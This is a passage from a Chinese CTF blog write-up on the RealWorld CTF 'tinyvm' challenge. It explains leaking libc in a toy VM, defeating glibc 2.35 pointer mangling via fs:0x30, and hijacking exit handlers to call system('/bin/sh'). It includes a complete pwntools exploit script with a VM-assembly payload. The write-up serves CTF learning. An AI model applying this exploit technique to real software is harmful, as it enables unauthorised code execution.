+<p>修改后。发现地址减小。结合汇编中的prt和mov，说明我们已经达到任意地址读写的目的了。只不过需要注意输入的内容需要乘上4才是和分配的<code>memory</code>之间的偏移。并且<code>memory</code>开始的位置是在一开始分配空间加上0x10地址的地方。</p>
+<p><img src="/.io//image-20230119185901319.png" alt="image-20230119185901319"></p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>原来这道题怎么探索libc版本才是难点。看了网上别人的wp，是通过逐步dump出所有libc字段的byte，然后直接string出结果的。dump的方法就是移动指针到和当前memory偏移固定的位置(这个位置也在7f开头的data部分，可能是一样的偏移？)然后全部打印并接受。得到远程的libc是<code>Ubuntu GLIBC 2.35-0ubuntu3.1</code>，没有hook函数，可能需要找exit_hook或者FSOP。</p>
+<h3 id="如何调试"><a href="#如何调试" class="headerlink" title="如何调试"></a>如何调试</h3><p>这道题给了我们一种新的调试方法。如果一个文件只接收命令行参数，那就没法用pwntools在动态调试的时候下断点。这里参考了<a target="_blank" rel="noopener" href="https://ctftime.org/writeup/36064">网上的wp</a>种的脚本，直接使用的是gdb.debug()启动的binary。</p>
+<h3 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h3><p>首先找到和PLT表的偏移。这里学到两个新的命令，vmmap libc和tele。似乎后者可以简单解引用。经过测试，两者之间距离是不变的。因此可以用这里的PLT泄露libc。这里选择calloc的plt。</p>
+<p><img src="/.io//image-20230119195404058.png" alt="image-20230119195404058"></p>
+<p>对应的.vm</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">file = &quot;&quot;&quot;</span><br><span class="line">start:</span><br><span class="line">	mov eax, [17331215]</span><br><span class="line">    prn eax</span><br><span class="line">    mov eax, [17331216]</span><br><span class="line">    prn eax</span><br><span class="line">end:</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>这种接收方式并不是很稳定。主要原因是mmap出来的堆地址会变化</p>
+<p><img src="/.io//image-20230119204820469.png" alt="image-20230119204820469"></p>
+<h3 id="写hook"><a href="#写hook" class="headerlink" title="写hook"></a>写hook</h3><p>首先需要注意到：程序中的地址都是int大小的，因此在64位下并不能直接写入任意地址。我们可以利用以下函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">tvm_stack_push</span><span class="params">(<span class="keyword">struct</span> tvm_mem *mem, <span class="type">int</span> *item)</span></span><br><span class="line">&#123;</span><br><span class="line">	mem-&gt;registers[<span class="number">0x6</span>].i32_ptr -= <span class="number">1</span>;</span><br><span class="line">	*mem-&gt;registers[<span class="number">0x6</span>].i32_ptr = *item;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>来进行任意地址写。不过就是可能破坏esp指针。每次push的时候将会在esp所在指针-4的地方写入item内容。</p>
+<p>对于2.35，能用的hook函数应该只剩下exit_hook和FSOP里面的一些gadget了。这里依然学习的是<a target="_blank" rel="noopener" href="https://ctftime.org/writeup/36064">上面提到的wp</a>,里面提到了一种很有意思的针对<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.35/source/stdlib/exit.c">exit_hook</a>的利用方法。这种方法需要我们能够<strong>至少三次任意地址写</strong>，<strong>一次写fs[30]，另一次写exithook，其中包含两个变量，一个是system，一个是binsh的地址</strong>。如果不能三次任意地址写，需要有一次读，两次写。其中读把fs[30]读出来。因为在2.35中，对exithook做了一些mangle处理，防止被直接写函数。(注意下面的<code>PTR_DEMANGLE</code>和<code>PTR_MANGLE</code>)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Call all functions registered with `atexit&#x27; and `on_exit&#x27;,</span></span><br><span class="line"><span class="comment">   in the reverse of the order in which they were registered</span></span><br><span class="line"><span class="comment">   perform stdio cleanup, and terminate program execution with STATUS.  */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line">attribute_hidden</span><br><span class="line">__run_exit_handlers (<span class="type">int</span> status, <span class="keyword">struct</span> exit_function_list **listp,</span><br><span class="line">		     <span class="type">bool</span> run_list_atexit, <span class="type">bool</span> run_dtors)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* First, call the TLS destructors.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line">  <span class="keyword">if</span> (&amp;__call_tls_dtors != <span class="literal">NULL</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (run_dtors)</span><br><span class="line">      __call_tls_dtors ();</span><br><span class="line"></span><br><span class="line">  __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We do it this way to handle recursive calls to exit () made by</span></span><br><span class="line"><span class="comment">     the functions registered with `atexit&#x27; and `on_exit&#x27;. We call</span></span><br><span class="line"><span class="comment">     everyone on the list and use the status value in the last</span></span><br><span class="line"><span class="comment">     exit (). */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">cur</span> =</span> *listp;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (cur == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Exit processing complete.  We will not allow any more</span></span><br><span class="line"><span class="comment">	     atexit/on_exit registrations.  */</span></span><br><span class="line">	  __exit_funcs_done = <span class="literal">true</span>;</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> (cur-&gt;idx &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">const</span> <span class="title">f</span> =</span> &amp;cur-&gt;fns[--cur-&gt;idx];</span><br><span class="line">	  <span class="type">const</span> <span class="type">uint64_t</span> new_exitfn_called = __new_exitfn_called;</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">switch</span> (f-&gt;flavor)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="type">void</span> (*atfct) (<span class="type">void</span>);</span><br><span class="line">	      <span class="type">void</span> (*onfct) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">	      <span class="type">void</span> (*cxafct) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line">	      <span class="type">void</span> *arg;</span><br><span class="line"></span><br><span class="line">	    <span class="keyword">case</span> ef_free:</span><br><span class="line">	    <span class="keyword">case</span> ef_us:</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    <span class="keyword">case</span> ef_on:</span><br><span class="line">	      onfct = f-&gt;func.on.fn;</span><br><span class="line">	      arg = f-&gt;func.on.arg;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">	      PTR_DEMANGLE (onfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	      <span class="comment">/* Unlock the list while we call a foreign function.  */</span></span><br><span class="line">	      __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">	      onfct (status, arg);</span><br><span class="line">	      __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    <span class="keyword">case</span> ef_at:</span><br><span class="line">	      atfct = f-&gt;func.at;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">	      PTR_DEMANGLE (atfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	      <span class="comment">/* Unlock the list while we call a foreign function.  */</span></span><br><span class="line">	      __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">	      atfct ();</span><br><span class="line">	      __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    <span class="keyword">case</span> ef_cxa:</span><br><span class="line">	      <span class="comment">/* To avoid dlclose/exit race calling cxafct twice (BZ 22180),</span></span><br><span class="line"><span class="comment">		 we must mark this function as ef_free.  */</span></span><br><span class="line">	      f-&gt;flavor = ef_free;</span><br><span class="line">	      cxafct = f-&gt;func.cxa.fn;</span><br><span class="line">	      arg = f-&gt;func.cxa.arg;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">	      PTR_DEMANGLE (cxafct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	      <span class="comment">/* Unlock the list while we call a foreign function.  */</span></span><br><span class="line">	      __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">	      cxafct (arg, status);</span><br><span class="line">	      __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))</span><br><span class="line">	    <span class="comment">/* The last exit function, or another thread, has registered</span></span><br><span class="line"><span class="comment">	       more exit functions.  Start the loop over.  */</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      *listp = cur-&gt;next;</span><br><span class="line">      <span class="keyword">if</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line">	<span class="comment">/* Don&#x27;t free the last element in the chain, this is the statically</span></span><br><span class="line"><span class="comment">	   allocate element.  */</span></span><br><span class="line">	<span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (run_list_atexit)</span><br><span class="line">    RUN_HOOK (__libc_atexit, ());</span><br><span class="line"></span><br><span class="line">  _exit (status);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>其中<code>mangle</code>所做的等价于下面的伪代码。所以我们要么把<code>fs:0x30</code>改成0，要么读出来，才能用exit_hook。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PTR_MANGLE</span></span><br><span class="line">xor    reg,QWORD PTR fs:<span class="number">0x30</span></span><br><span class="line">rol    reg,<span class="number">0x11</span></span><br><span class="line">call   reg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// PTR_DEMANGLE</span></span><br><span class="line">ror    reg,<span class="number">0x11</span></span><br><span class="line">xor    reg,QWORD PTR fs:<span class="number">0x30</span></span><br><span class="line">call   reg</span><br></pre></td></tr></table></figure>
+
+<p>假如说要看[fs:30]，用到的命令如下</p>
+<p><img src="/.io//image-20230119212239825.png" alt="image-20230119212239825"></p>
+<p>清除canary相关代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add esp, 65028080</span><br><span class="line">sub esp, 10376</span><br><span class="line">push 0</span><br><span class="line">push 0</span><br></pre></td></tr></table></figure>
+
+<p>接下来写hook，需要写两个，一个是system地址，另一个是binsh地址。其中还需要做一个rotate工作。这两部分地址需要放在下面<code>fn</code>和<code>arg</code>的地方。其中fn需要做rotate。事实上，这两者的地址也是相连的。因此我们可以直接用四次push来写入数字。</p>
+<p><img src="/.io//image-20230120125954340.png" alt="image-20230120125954340"></p>
+<p>综上可知：我们要做的事情是</p>
+<ol>
+<li>写[fs:30]为0</li>
+<li>计算system地址，并左移0x11位</li>
+<li>计算”/bin/sh”地址</li>
+<li>在<code>initial</code>中fn和arg的地方写入system的Binsh</li>
+<li>getshell</li>
+</ol>
+<h3 id="exp-vm"><a href="#exp-vm" class="headerlink" title="exp.vm"></a>exp.vm</h3><p>exp中使用了大量的立即数。因为这个里面似乎能直接得到libc地址，加上相关偏移即可。这里其实难点还有一个是怎么获得libc。我这里使用的是<code>libc6_2.35-0ubuntu3_amd64</code>。其中rol的汇编代码是借鉴上述提到的writeup中的。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename=<span class="string">&quot;./tvmi&quot;</span></span><br><span class="line">libc_name=<span class="string">&quot;/home/nicholas/glibc-all-in-one/libs/libc6_2.35-0ubuntu3_amd64/libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">libc=ELF(libc_name)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;75&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file1 = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">setbit1:</span></span><br><span class="line"><span class="string">    cmp ecx, 0</span></span><br><span class="line"><span class="string">    je set0_1</span></span><br><span class="line"><span class="string">    mov ecx, 1</span></span><br><span class="line"><span class="string">set0_1:</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">setbit2:</span></span><br><span class="line"><span class="string">    cmp edx, 0</span></span><br><span class="line"><span class="string">    je set0_2</span></span><br><span class="line"><span class="string">    mov edx, 1</span></span><br><span class="line"><span class="string">set0_2:</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">rol: </span></span><br><span class="line"><span class="string">    mov edi, 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    rol_loop:</span></span><br><span class="line"><span class="string">        mov ecx, eax</span></span><br><span class="line"><span class="string">        and ecx, 0x80000000</span></span><br><span class="line"><span class="string">        call setbit1</span></span><br><span class="line"><span class="string">        shl eax, 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        mov edx, ebx</span></span><br><span class="line"><span class="string">        and edx, 0x80000000</span></span><br><span class="line"><span class="string">        call setbit2</span></span><br><span class="line"><span class="string">        shl ebx, 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        or eax, edx</span></span><br><span class="line"><span class="string">        or ebx, ecx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        inc edi</span></span><br><span class="line"><span class="string">        cmp edi, esi</span></span><br><span class="line"><span class="string">        jl rol_loop</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string">start:</span></span><br><span class="line"><span class="string">    mov r13, esp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	mov eax, [17331215]</span></span><br><span class="line"><span class="string">    mov r08, eax</span></span><br><span class="line"><span class="string">    mov eax, [17331216]</span></span><br><span class="line"><span class="string">    mov r09, eax</span></span><br><span class="line"><span class="string">    sub r09, 163968</span></span><br><span class="line"><span class="string">    mov r15, r09</span></span><br><span class="line"><span class="string">    mov r14, r08</span></span><br><span class="line"><span class="string">    prn r14</span></span><br><span class="line"><span class="string">    prn r15</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    add esp, 65028080</span></span><br><span class="line"><span class="string">    sub esp, 10376</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov r12, ebp</span></span><br><span class="line"><span class="string">    mov esp, ebp</span></span><br><span class="line"><span class="string">    add r09, 331104</span></span><br><span class="line"><span class="string">    mov eax, r08</span></span><br><span class="line"><span class="string">    mov ebx, r09</span></span><br><span class="line"><span class="string">    mov esi, 17</span></span><br><span class="line"><span class="string">    call rol</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov r08, eax</span></span><br><span class="line"><span class="string">    mov r09, ebx</span></span><br><span class="line"><span class="string">    prn r08</span></span><br><span class="line"><span class="string">    prn r09</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov eax, r14</span></span><br><span class="line"><span class="string">    mov ebx, r15</span></span><br><span class="line"><span class="string">    add ebx, 1935000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov esp, r13</span></span><br><span class="line"><span class="string">    prn esp</span></span><br><span class="line"><span class="string">    add esp, 67235596</span></span><br><span class="line"><span class="string">    push r09</span></span><br><span class="line"><span class="string">    add esp, 8</span></span><br><span class="line"><span class="string">    push r08</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    add esp, 8</span></span><br><span class="line"><span class="string">    push ebx</span></span><br><span class="line"><span class="string">    add esp, 8</span></span><br><span class="line"><span class="string">    push eax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">end:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">fin = <span class="built_in">open</span>(<span class="string">&#x27;./exp.vm&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">fin.write(file1)</span><br><span class="line">fin.close()</span><br><span class="line"></span><br><span class="line">script  = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">b printf</span></span><br><span class="line"><span class="string">b __run_exit_handlers</span></span><br><span class="line"><span class="string">continue</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">io = process(argv=[filename,<span class="string">&quot;./exp.vm&quot;</span>])</span><br><span class="line"><span class="comment"># io = gdb.debug([elf.path,&quot;./exp.vm&quot;], gdbscript=script)</span></span><br><span class="line">num1 = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>),<span class="number">10</span>)</span><br><span class="line">success(<span class="string">&quot;hex num1: &quot;</span> + <span class="built_in">hex</span>(num1))</span><br><span class="line">num2 = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>),<span class="number">10</span>)</span><br><span class="line">success(<span class="string">&quot;hex num2: &quot;</span> + <span class="built_in">hex</span>(num2))</span><br><span class="line"><span class="keyword">if</span>(num2&lt;<span class="number">0</span>):</span><br><span class="line">    num2 = - num2</span><br><span class="line">libc_base= ((num1&lt;&lt;<span class="number">32</span>) | num2)</span><br><span class="line">success(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;system: &quot;</span> + <span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/.io//image-20230120154910423.png" alt="image-20230120154910423"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这是一道洞比较常见，但是利用方式比较新颖的vm，学习到了<strong>2.35下的exit_hook</strong>，以及诸多got表的利用。另外还有写fs的神奇操作。</p>
+<p>此外，还有直接从gdb中启动程序，并且使得地址空间为常规启动时的方法(直接gdb file相关偏移是不正确的)</p>
+<p>好久没有做题目了，会感觉还是挺生疏的，光调试就花了将近一天的时间。但是收获满满~</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2023/01/20/rwctf-tinyvm/">rwctf-tinyvm</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页"></a></p>
+        <p><span>发布时间:</span>2023-01-20, 16:00:56</p>
+        <p><span>最后更新:</span>2023-01-20, 16:02:00</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2023/01/20/rwctf-tinyvm/" title="rwctf-tinyvm">https://nicholas-wei.github.io/2023/01/20/rwctf-tinyvm/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://nicholas-wei.github.io/2023/01/20/rwctf-tinyvm/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2023/01/24/bi0sctf-2023/">
+                    bi0sctf-2023
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2023/01/19/wasm-pwn/">
+                    wasm-1
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#rwctf-tinyvm"><span class="toc-number">1.</span> <span class="toc-text">rwctf-tinyvm</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">源码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#stack%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="toc-number">1.1.1.</span> <span class="toc-text">stack初始化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E4%BA%8E%E8%BE%93%E5%85%A5%E7%9A%84%E8%A7%A3%E9%87%8A"><span class="toc-number">1.1.2.</span> <span class="toc-text">对于输入的解释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C"><span class="toc-number">1.1.3.</span> <span class="toc-text">运行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC"><span class="toc-number">1.2.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">1.3.</span> <span class="toc-text">exp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95"><span class="toc-number">1.3.1.</span> <span class="toc-text">如何调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2libc"><span class="toc-number">1.3.2.</span> <span class="toc-text">泄露libc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99hook"><span class="toc-number">1.3.3.</span> <span class="toc-text">写hook</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-vm"><span class="toc-number">1.3.4.</span> <span class="toc-text">exp.vm</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.4.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
